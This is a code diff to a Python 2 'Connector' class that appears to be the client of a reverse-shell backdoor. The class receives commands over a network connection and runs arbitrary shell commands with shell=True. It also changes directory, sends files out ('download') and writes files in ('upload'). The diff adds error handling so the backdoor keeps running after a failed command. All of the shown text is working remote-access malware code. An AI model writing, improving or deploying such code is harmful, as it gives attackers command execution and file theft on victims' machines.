@@ -19,6 +19,9 @@ class Connector:
             except ValueError:
                 continue
 
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
     def change_working_directory_to(self, path):
         os.chdir(path)
         return "[+] Changing working directory to " + path
@@ -36,15 +39,18 @@ class Connector:
         while True:
             print("ON")
             command = self.reliable_receive()
-            if command[0] == "exit":
-                self.connection.close()
-                exit()
-            elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_working_directory_to(command[1])
-            elif command[0] == "download":
-                command_result = self.read_file(command[1])
-            elif command[0] == "upload":
-                command_result = self.write_file(command[1], command[2])
-            else:
-                command_result = subprocess.check_output(command, shell=True)
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(command)
+            except Exception, e:
+                command_result = "[-] Error, during command execution.\r\n" + e.message + "\r\n"
             self.reliable_send(command_result)
